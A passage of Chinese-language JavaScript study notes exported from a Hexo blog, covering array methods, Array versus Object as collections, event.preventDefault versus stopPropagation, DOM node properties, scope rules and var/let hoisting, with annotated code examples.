<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.shift(); <span class="comment">//a:[2,3,4,5] b:1</span></span><br></pre></td></tr></table></figure>
<h4 id="unshift"><a class="markdownIt-Anchor" href="#unshift"></a> <code>unshift()</code></h4>
<p>将参数添加到原数组开头，并返回数组的长度</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.unshift(<span class="number">-2</span>,<span class="number">-1</span>); <span class="comment">//a:[-2,-1,1,2,3,4,5] b:7</span></span><br></pre></td></tr></table></figure>
<p>注:在IE6.0下测试返回值总为undefined，FF2.0下测试返回值为7，所以这个方法的返回值不可靠，需要用返回值时可用splice代替本方法来使用。</p>
<h4 id="pop"><a class="markdownIt-Anchor" href="#pop"></a> <code>pop()</code></h4>
<p>删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.pop(); <span class="comment">//a:[1,2,3,4] b:5</span></span><br></pre></td></tr></table></figure>
<h4 id="push"><a class="markdownIt-Anchor" href="#push"></a> <code>push()</code></h4>
<p>将参数添加到原数组末尾，并返回数组的长度</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.push(<span class="number">6</span>,<span class="number">7</span>); <span class="comment">//a:[1,2,3,4,5,6,7] b:7</span></span><br></pre></td></tr></table></figure>
<h4 id="concat-2"><a class="markdownIt-Anchor" href="#concat-2"></a> <code>concat()</code></h4>
<p>返回一个新数组，是将参数添加到原数组中构成的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.concat(<span class="number">6</span>,<span class="number">7</span>); <span class="comment">//a:[1,2,3,4,5] b:[1,2,3,4,5,6,7]</span></span><br></pre></td></tr></table></figure>
<h4 id="splicestartdeletecountval1val2"><a class="markdownIt-Anchor" href="#splicestartdeletecountval1val2"></a> <code>splice(start,deleteCount,val1,val2,...)</code></h4>
<p>从start位置开始删除deleteCount项，并从该位置起插入val1,val2,…</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.splice(<span class="number">2</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>); <span class="comment">//a:[1,2,7,8,9,5] b:[3,4]   </span></span><br><span class="line"><span class="keyword">var</span> b = a.splice(<span class="number">0</span>,<span class="number">1</span>); <span class="comment">//同shift   </span></span><br><span class="line">a.splice(<span class="number">0</span>,<span class="number">0</span>,<span class="number">-2</span>,<span class="number">-1</span>); <span class="keyword">var</span> b = a.length; <span class="comment">//同unshift   </span></span><br><span class="line"><span class="keyword">var</span> b = a.splice(a.length<span class="number">-1</span>,<span class="number">1</span>); <span class="comment">//同pop   </span></span><br><span class="line">a.splice(a.length,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>); <span class="keyword">var</span> b = a.length; <span class="comment">//同push</span></span><br></pre></td></tr></table></figure>
<h4 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <code>reverse()</code></h4>
<p>将数组反序</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.reverse(); <span class="comment">//a:[5,4,3,2,1] b:[5,4,3,2,1]</span></span><br></pre></td></tr></table></figure>
<h4 id="sortorderfunction"><a class="markdownIt-Anchor" href="#sortorderfunction"></a> <code>sort(orderfunction)</code></h4>
<p>按指定的参数对数组进行排序</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.sort(); <span class="comment">//a:[1,2,3,4,5] b:[1,2,3,4,5]</span></span><br></pre></td></tr></table></figure>
<h4 id="slicestartend"><a class="markdownIt-Anchor" href="#slicestartend"></a> <code>slice(start,end)</code></h4>
<p>返回从原数组中指定开始下标到结束下标之间的项组成的新数组</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">2</span>,<span class="number">5</span>); <span class="comment">//a:[1,2,3,4,5] b:[3,4,5]</span></span><br></pre></td></tr></table></figure>
<h4 id="joinseparator"><a class="markdownIt-Anchor" href="#joinseparator"></a> <code>join(separator)</code></h4>
<p>将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];   </span><br><span class="line"><span class="keyword">var</span> b = a.join(<span class="string">"|"</span>); <span class="comment">//a:[1,2,3,4,5] b:"1|2|3|4|5"</span></span><br></pre></td></tr></table></figure>
<h4 id="数组方法小结"><a class="markdownIt-Anchor" href="#数组方法小结"></a> 数组方法小结</h4>
<p>数组是JavaScript提供的一个内部对象，它是一个标准的集合，我们可以添加(push)、删除(shift)里面元素，我们还可以通过for循环遍历里面的元素，那么除了数组我们在JavaScript里还可以有别的集合吗?</p>
<p>由于JavaScript的语言特性，我们可以向通用对象动态添加和删除属性。所以Object也可以看成是JS的一种特殊的集合。下面比较一下Array和Object的特性:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">　　<span class="comment">//Array:  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/*新建:*/</span><span class="keyword">var</span> ary = <span class="keyword">new</span> <span class="built_in">Array</span>(); 或 <span class="keyword">var</span> ary = [];   </span><br><span class="line"><span class="comment">/*增加:*/</span>ary.push(value);   </span><br><span class="line"><span class="comment">/*删除:*/</span><span class="keyword">delete</span> ary[n];   </span><br><span class="line"><span class="comment">/*遍历:*/</span><span class="keyword">for</span> ( <span class="keyword">var</span> i=<span class="number">0</span> ; i &lt; ary.length ; ++i ) ary[i];  </span><br><span class="line">  </span><br><span class="line">　　<span class="comment">//Object:  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/*新建:*/</span><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>(); 或 <span class="keyword">var</span> obj = &#123;&#125;;   </span><br><span class="line"><span class="comment">/*增加:*/</span>obj[key] = value; (key为string)   </span><br><span class="line"><span class="comment">/*删除:*/</span><span class="keyword">delete</span> obj[key];   </span><br><span class="line"><span class="comment">/*遍历:*/</span><span class="keyword">for</span> ( <span class="keyword">var</span> key <span class="keyword">in</span> obj ) obj[key];</span><br></pre></td></tr></table></figure>
<p>从上面的比较可以看出Object完全可以作为一个集合来使用，在使用Popup窗口创建无限级Web页菜单(3)中我介绍过Eric实现的那个__MenuCache__，它也就是一个模拟的集合对象。</p>
<p>如果我们要在Array中检索出一个指定的值，我们需要遍历整个数组:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> keyword = ;   </span><br><span class="line">　　<span class="keyword">for</span> ( <span class="keyword">var</span> i=<span class="number">0</span> ; i &lt; ary.length ; ++i )   </span><br><span class="line">　　&#123;   </span><br><span class="line">　　<span class="keyword">if</span> ( ary[i] == keyword )   </span><br><span class="line">　　&#123;   </span><br><span class="line">　　<span class="comment">// todo   </span></span><br><span class="line">　　&#125;   </span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure>
<p>而我们在Object中检索一个指定的key的条目，只需要是要使用:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> key = <span class="string">''</span>;   </span><br><span class="line">　　<span class="keyword">var</span> value = obj[key];   </span><br><span class="line">　　<span class="comment">// todo</span></span><br></pre></td></tr></table></figure>
<p>Object的这个特性可以用来高效的检索Unique的字符串集合，遍历Array的时间复杂度是O(n)，而遍历Object的时间复杂度是O(1)。虽然对于10000次集合的for检索代价也就几十ms，可是如果是1000<code>*</code>1000次检索或更多，使用Object的优势一下就体现出来了。在此之前我做了一个mapping，把100个Unique的字符mapping到1000个字符串数组上，耗时25-30s!后来把for遍历改成了Object模拟的集合的成员引用，同样的数据量mapping，耗时仅1.7-2s!!!</p>
<p>对于集合的遍历效率(从高到低):var value = obj[key]; &gt; for ( ; ; ) &gt; for ( in )。效率最差的就是for( in )了，如果集合过大，尽量不要使用for ( in )遍历。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>字符串</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>js事件之event.preventDefault()与event.stopPropagation()用法区别</title>
    <url>/hexolog/post/4f797af7.html</url>
    <content><![CDATA[<h3 id="eventpreventdefault用法介绍"><a class="markdownIt-Anchor" href="#eventpreventdefault用法介绍"></a> event.preventDefault()用法介绍</h3>
<p>该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）。例如，如果 type 属性是 “submit”，在事件传播的任意阶段可以调用任意的事件句柄，通过调用该方法，可以阻止提交表单。注意，如果 Event 对象的 cancelable 属性是 fasle，那么就没有默认动作，或者不能阻止默认动作。无论哪种情况，调用该方法都没有作用。</p>
<p>该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）。</p>
<p>例如，如果 type 属性是 “submit”，在事件传播的任意阶段可以调用任意的事件句柄，通过调用该方法，可以阻止提交表单。</p>
<p>注意，如果 Event 对象的 cancelable 属性是 fasle，那么就没有默认动作，或者不能阻止默认动作。无论哪种情况，调用该方法都没有作用。</p>
<h3 id="eventstoppropagation用法介绍"><a class="markdownIt-Anchor" href="#eventstoppropagation用法介绍"></a> event.stopPropagation()用法介绍</h3>
<p>该方法将停止事件的传播，阻止它被分派到其他 Document 节点。在事件传播的任何阶段都可以调用它。注意，虽然该方法不能阻止同一个 Document 节点上的其他事件句柄被调用，但是它可以阻止把事件分派到其他节点</p>
<p>该方法将停止事件的传播，阻止它被分派到其他 Document 节点。在事件传播的任何阶段都可以调用它。</p>
<p>注意:虽然该方法不能阻止同一个 Document 节点上的其他事件句柄被调用，但是它可以阻止把事件分派到其他节点。</p>
<p>event是DOM的事件方法，所以不是单独使用，比如指定DOM</p>
<h3 id="dom"><a class="markdownIt-Anchor" href="#dom"></a> DOM</h3>
<p>1.元素节点有tagName 、nodeName 、localName属性；其中tagName 、nodeName相同，都是大写，localName是小写；</p>
<p>其他节点只有nodeName 、localName属性，其中属性节点localName和nodeName相同，文本节点localName为null；</p>
<p>2.childNodes是指元素的所有直接子节点，包括元素节点、文本节点，不包括属性节点</p>
<p>children 返回元素的所有直接子的元素节点</p>
<p>二者区别在于后者不包括文本节点</p>
<p>childElementCount 表示的是子元素节点的个数，等于children的length；</p>
<p>3.attibutes  存有html属性，包括class、id等</p>
<p>properties</p>
<p>4.获取元素节点内的所有文本值</p>
<p>innerText      IE和chrome支持</p>
<p>textContent   高版本浏览器支持</p>
<p>5.outerHTML 与 innerHTML的区别在与是否包换元素本身，包括就是outerHtml;</p>
]]></content>
  </entry>
  <entry>
    <title>Js作用域问题一步一步透彻理解</title>
    <url>/hexolog/post/ae13e827.html</url>
    <content><![CDATA[<h2 id="黄金守则第一条"><a class="markdownIt-Anchor" href="#黄金守则第一条"></a> <strong>黄金守则第一条</strong></h2>
<p>js没有块级作用域（你可以自己闭包或其他方法实现），只有函数级作用域，函数外面的变量函数里面可以找到，函数里面的面找不到。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	alert(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bbb</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> a = <span class="number">20</span>;</span><br><span class="line">	aaa();</span><br><span class="line">&#125;</span><br><span class="line">bbb();      <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="黄金守则第二条"><a class="markdownIt-Anchor" href="#黄金守则第二条"></a> <strong>黄金守则第二条</strong></h2>
<p>变量的查找是就近原则，去寻找var定义的变量，当就近没有找到的时候就去查找外层。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">	alert(a);</span><br><span class="line">	<span class="keyword">var</span> a=b=<span class="number">10</span>;  <span class="comment">//相当于 var a = 10; b=10; 此时 b 为全局变量，a 函数 aaa 的只是局部变量</span></span><br><span class="line">&#125;</span><br><span class="line">aaa();	      <span class="comment">// undefined ----- var变量声明提前（仅仅将声明提前，初始化仍在远处进行）</span></span><br><span class="line">alert(b);     <span class="comment">// 10</span></span><br><span class="line">alert(a);     <span class="comment">// console面板报错 “ReferenceError: a is not defined”</span></span><br></pre></td></tr></table></figure>
<h2 id="黄金守则第三条"><a class="markdownIt-Anchor" href="#黄金守则第三条"></a> <strong>黄金守则第三条</strong></h2>
<p>当参数跟局部变量重名时，优先级是等同的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">	alert(a);</span><br><span class="line">	<span class="keyword">var</span> a = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line">aaa(a);      <span class="comment">// 10</span></span><br><span class="line">aaa();       <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<h2 id="黄金守则第四条"><a class="markdownIt-Anchor" href="#黄金守则第四条"></a> <strong>黄金守则第四条</strong></h2>
<p>参数的传递都是<code>按值传递</code>。基本类型的这个值指基本类型值，引用类型的这个值指引用类型的指针。</p>
<h3 id="变量的情况"><a class="markdownIt-Anchor" href="#变量的情况"></a> <strong>变量的情况</strong></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b +=<span class="number">3</span>;</span><br><span class="line">alert(a);<span class="comment">//5</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b=a;</span><br><span class="line">b.push(<span class="number">4</span>);</span><br><span class="line">alert(a);<span class="comment">//[1,2,3,4];</span></span><br></pre></td></tr></table></figure>
<p>引用类型变量重新赋值后，会不一样：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b=a;</span><br><span class="line">b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]    <span class="comment">// 此处，b被重新赋值了，也就不再指向a了。</span></span><br><span class="line">b.push(<span class="number">4</span>);</span><br><span class="line">alert(a);<span class="comment">//[1,2,3];</span></span><br></pre></td></tr></table></figure>
<h3 id="参数的情况"><a class="markdownIt-Anchor" href="#参数的情况"></a> <strong>参数的情况</strong></h3>
<p>参数与变量的作用域是相似的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">	a += <span class="number">3</span>;</span><br><span class="line">	alert(a);</span><br><span class="line">&#125;</span><br><span class="line">aaa(a);    <span class="comment">// 13</span></span><br><span class="line">alert(a);  <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">	a.push(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">aaa(a);</span><br><span class="line">alert(a);  <span class="comment">// 1,2,3,4</span></span><br></pre></td></tr></table></figure>
<p>引用类型参数重新赋值后，会不一样：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">	a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">	a.push(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">aaa(a);</span><br><span class="line">alert(a);  <span class="comment">// 1,2,3</span></span><br></pre></td></tr></table></figure>
<h2 id="最后一个比较怪的"><a class="markdownIt-Anchor" href="#最后一个比较怪的"></a> <strong>最后一个比较怪的</strong></h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arry = [];</span><br><span class="line">arry[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line">arry[<span class="number">1</span>] = <span class="string">'b'</span>;</span><br><span class="line">arry.foo = <span class="string">'c'</span>;</span><br><span class="line">arry[<span class="string">'foo'</span>] = <span class="string">'d'</span>;            <span class="comment">//不报错</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> arry.foo);    <span class="comment">//  step2:   string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> arry[<span class="string">'foo'</span>]);  <span class="comment">//  step3:   string</span></span><br><span class="line"><span class="built_in">console</span>.log(arry.foo);           <span class="comment">//   step4:   d</span></span><br><span class="line"><span class="built_in">console</span>.log(arry[<span class="string">'foo'</span>]);        <span class="comment">//   step5:   d</span></span><br><span class="line"><span class="built_in">console</span>.log(arry.length);  		<span class="comment">// step6:   2</span></span><br><span class="line">alert(arry);               		<span class="comment">// step1:   a,b</span></span><br><span class="line">arry[foo] = <span class="string">'e'</span>;             <span class="comment">//报错   ReferenceError: foo is not defined</span></span><br></pre></td></tr></table></figure>
<ul>
<li>因为：
<ol>
<li>数组对象只有一个属性，那就是 <code>lenght</code> (同时，其他普通对象都没有 <code>length</code> 属性)；</li>
<li>数组也是对象；</li>
<li>对象属性的访问方式有两种，<code>.</code> 与 <code>[]</code> (<code>[]</code> 内字符串属性要加 <code>&quot;&quot;</code>)；</li>
<li>个人推断： 数组作为对象的一种，可以对其使用普通对象的所有方法与属性，但不属于数组对象的属性和方法并不会对数组产生实质影响。</li>
</ol>
</li>
</ul>
<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <strong>参考</strong></h2>
<ul>
<li><a href="https://www.cnblogs.com/skylar/p/3986087.html#comment_tip" target="_blank" rel="noopener">js作用域问题一步步透彻理解</a>—<a href="http://zhangmengxue.com" target="_blank" rel="noopener">skylar艺璇</a></li>
<li>javascript 高级程序设计</li>
<li><a href="https://blog.csdn.net/shuren1991/article/details/67639250" target="_blank" rel="noopener">JS 对象属性访问的2种方式和用途</a>
<blockquote>
<p>内容：判断一个字符串中出现次数最多的字符，统计这个次数</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>作用域</tag>
      </tags>
  </entry>
  <entry>
    <title>Js变量提升、临时死区、作用域、立即执行函数</title>
    <url>/hexolog/post/56be0507.html</url>
    <content><![CDATA[<p>提到 JS 中声明变量的方式，必然提及var、let、const、function 四个关键词，其中 var、function 声明的变量会发生变量提升。</p>
<h3 id="var"><a class="markdownIt-Anchor" href="#var"></a> var</h3>
<p>var 是初学者常用的声明变量的方式，简单的，声明任何数据都可以用 var :</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>；<span class="comment">// declare a number</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">''</span>; <span class="comment">// declare a string</span></span><br><span class="line"><span class="keyword">var</span> bool = <span class="literal">true</span>； <span class="comment">// declare a boolean</span></span><br><span class="line"><span class="keyword">var</span> arr = []; <span class="comment">// declare a array</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;; <span class="comment">// declare a object</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;&#125;; <span class="comment">// declare a function</span></span><br></pre></td></tr></table></figure>
<p>以上声明变量的方式避免不了会发生变量提升，什么意思呢？以正常的思维来看，如果一个变量还未声明，那么该变量就不可用。但是 JS 中使用 var 声明的变量会发生提升，即 JS 引擎在解释语句时，遇到 var 声明的变量会把该变量放置于当前作用域的最前面，同时初始化为 undefined，且函数的提升在变量之前。举例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getA();</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print undefined</span></span><br></pre></td></tr></table></figure>
<p>为什么会打印出 undefined 呢？因为 a 发生了变量提升，且在 a 被赋值之前就使用了 a，此时 a 的值为 undefined，该段代码执行时的实际情形如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a; <span class="comment">// initialize 'a' to 'undefined'</span></span><br><span class="line">getA(); <span class="comment">// print undefined</span></span><br><span class="line">a = <span class="number">1</span>; <span class="comment">// then a is assigned to 1</span></span><br></pre></td></tr></table></figure>
<p>再来看下面的一种情况：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line">getA(); <span class="comment">// first print out undefined, then print out 2</span></span><br></pre></td></tr></table></figure>
<p>那么上面的代码执行时的实际情形如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a; <span class="comment">// initialize a to undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// then print out undefined</span></span><br><span class="line">    a = <span class="number">2</span>; <span class="comment">// a is assigned to 2</span></span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// then print out 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a; <span class="comment">// this 'a' is global variable</span></span><br><span class="line">a = <span class="number">1</span>; <span class="comment">// global a is assigned to 1</span></span><br><span class="line">getA();</span><br></pre></td></tr></table></figure>
<p>上段代码中第一次打印出的为什么不是 1 呢？如果不清楚变量提升以及作用域那么很容易犯这种低级错误。上段代码在执行时， getA 函数中首先将 var a 提升至 当前作用域 的最前面，即 getA 函数中的最前面。代码在执行时如何取值呢？当然是先看自己当前作用域有没有该值，如果有，就用当前作用域的值，如果没有，则顺着作用域链向上找，直到找到该变量为止。如何让上段代码输出 1 以及 2 该怎么办呢？很简单，去掉 getA 函数中的 var 即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print out global a's value: 1</span></span><br><span class="line">    a = <span class="number">2</span>; <span class="comment">// global a is assigned to 2</span></span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print out global a's value: 2</span></span><br><span class="line">&#125;</span><br><span class="line">getA();</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// print out global a's value: 2</span></span><br></pre></td></tr></table></figure>
<p>因为 getA 函数中没有 a，则顺着作用域链向上找，发现函数外有一个 a 变量，则打印出该变量中存储的值 1 ，此时打印出的 a 是函数外部的 a，再执行 a = 2 时，全局的 a 被赋值为 2。</p>
<p>那么问题来了：声明变量不加关键字一定会声明为全局变量吗？</p>
<p>答：如果函数外部没有同名的全局变量的话，那么就会生成全局变量。</p>
<p>举例一：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// error: a is not defined</span></span><br><span class="line">    a = <span class="number">1</span>; <span class="comment">// a is declared to global variable</span></span><br><span class="line">&#125;</span><br><span class="line">getA();</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// print out 1</span></span><br></pre></td></tr></table></figure>
<p>第一次打印出 a 时，函数内部没有声明的变量 a，顺着作用域链找也没有 a，就会抛出错误，第二次打印出 a 的时候，函数 getA 中声明了全局变量 a，会打印出 1。当然上述代码抛出错误之后，后面的语句不会执行，可以注释掉 getA 函数中的第一条语句再运行。</p>
<p>举例二：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print 1</span></span><br><span class="line">    a = <span class="number">2</span>; <span class="comment">// global a is assigned to 2</span></span><br><span class="line">&#125;</span><br><span class="line">getA();</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// print out 2</span></span><br></pre></td></tr></table></figure>
<p>上段代码中，getA 函数外部有一个全局变量 a，getA 中要声明与全局变量同名的变量时没有加变量关键字，因此 a = 2 的作用为将全局变量 a 赋值为 2。因此可以看出，声明变量时一定要加上变量关键字，否则会产生预料之外的错误。</p>
<p>如果一个变量没有定义就可以使用，是非常令人困惑的。针对这种情况，ES6 推出了声明变量的新关键字 let 以及 const 。</p>
<h3 id="let"><a class="markdownIt-Anchor" href="#let"></a> let</h3>
<p>let 关键字声明的变量是不会发生变量提升的，将之前的代码中的 var 改为 let 看看结果：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getA();</span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// error: a is not defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码执行实际情况为：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line">getA(); <span class="comment">// error: a is not defined</span></span><br><span class="line"><span class="keyword">let</span> a; <span class="comment">// initialize a to undefined</span></span><br><span class="line">a = <span class="number">1</span>; <span class="comment">// then a is assigned to 1</span></span><br></pre></td></tr></table></figure>
<p>在函数内部用 let 声明变量是一样的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// error: a is not defined</span></span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print out 2</span></span><br><span class="line">&#125;</span><br><span class="line">getA();</span><br></pre></td></tr></table></figure>
